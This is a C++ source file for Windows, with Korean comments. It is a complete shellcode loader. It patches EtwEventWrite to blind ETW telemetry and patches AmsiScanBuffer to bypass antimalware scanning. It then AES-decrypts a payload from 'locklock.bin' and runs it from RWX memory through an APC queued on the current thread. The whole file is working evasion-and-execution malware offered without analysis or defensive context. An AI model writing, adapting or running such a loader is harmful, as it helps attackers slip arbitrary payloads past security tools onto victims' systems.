#include <Windows.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <stdexcept>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

void PatchETW() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) return;
    void* pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;
    DWORD old;
    if (VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old)) {
        unsigned char patch[4] = { 0xC3, 0x90, 0x90, 0x90 };
        memcpy(pEtw, patch, 4);
        VirtualProtect(pEtw, 4, old, &old);
    }
}

void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    void* pAmsi = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsi) return;
    DWORD old;
    if (VirtualProtect(pAmsi, 6, PAGE_EXECUTE_READWRITE, &old)) {
        unsigned char patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        memcpy(pAmsi, patch, 6);
        VirtualProtect(pAmsi, 6, old, &old);
    }
}

// 파일 전체 읽기
std::vector<BYTE> ReadFileBytes(const char* path) {
    std::ifstream in(path, std::ios::binary);
    if (!in) throw std::runtime_error("Cannot open file");
    in.seekg(0, std::ios::end);
    auto size = in.tellg();
    in.seekg(0, std::ios::beg);
    std::vector<BYTE> buf(size);
    in.read(reinterpret_cast<char*>(buf.data()), size);
    return buf;
}

// AES‑256‑CBC 복호화 (CryptoAPI + CryptImportKey)
std::vector<BYTE> AESDecryptCryptoAPI(const BYTE* encData, DWORD encLen, const BYTE* key, const BYTE* iv) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    std::vector<BYTE> buffer(encData, encData + encLen);
    DWORD dataLen = encLen;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        throw std::runtime_error("CryptAcquireContext failed");

    struct {
        BLOBHEADER hdr;
        DWORD dwKeySize;
        BYTE keyData[32];
    } keyBlob = {};

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.dwKeySize = 32;
    memcpy(keyBlob.keyData, key, 32);

    if (!CryptImportKey(hProv, reinterpret_cast<BYTE*>(&keyBlob), sizeof(keyBlob), 0, 0, &hKey))
        throw std::runtime_error("CryptImportKey failed");

    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, const_cast<BYTE*>(iv), 0);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, buffer.data(), &dataLen))
        throw std::runtime_error("CryptDecrypt failed");

    buffer.resize(dataLen);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return buffer;
}

// APC 콜백용 함수
VOID CALLBACK APCFunc(ULONG_PTR param) {
    auto shellcode = reinterpret_cast<BYTE*>(param);
    ((void(*)())shellcode)();
}

int main() {
    try {
        PatchETW();
        PatchAMSI();

        auto fullData = ReadFileBytes("locklock.bin");
        if (fullData.size() < 48) throw std::runtime_error("Encrypted file too small");

        const BYTE* key = fullData.data();
        const BYTE* iv = fullData.data() + 32;
        const BYTE* encShell = fullData.data() + 48;
        DWORD encSize = static_cast<DWORD>(fullData.size() - 48);

        auto shellcode = AESDecryptCryptoAPI(encShell, encSize, key, iv);
        std::cout << "[*] Decrypted shellcode first 8 bytes: ";
        for (size_t i = 0; i < 8 && i < shellcode.size(); ++i) printf("%02X ", shellcode[i]);
        std::cout << std::endl;

        LPVOID remote = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote) throw std::runtime_error("VirtualAlloc failed");
        memcpy(remote, shellcode.data(), shellcode.size());


        HANDLE hThread = GetCurrentThread();
        if (QueueUserAPC(APCFunc, hThread, reinterpret_cast<ULONG_PTR>(remote)) == 0)
            throw std::runtime_error("QueueUserAPC failed");

        SleepEx(0, TRUE);

        std::cout << "[*] Shellcode executed via APC." << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}
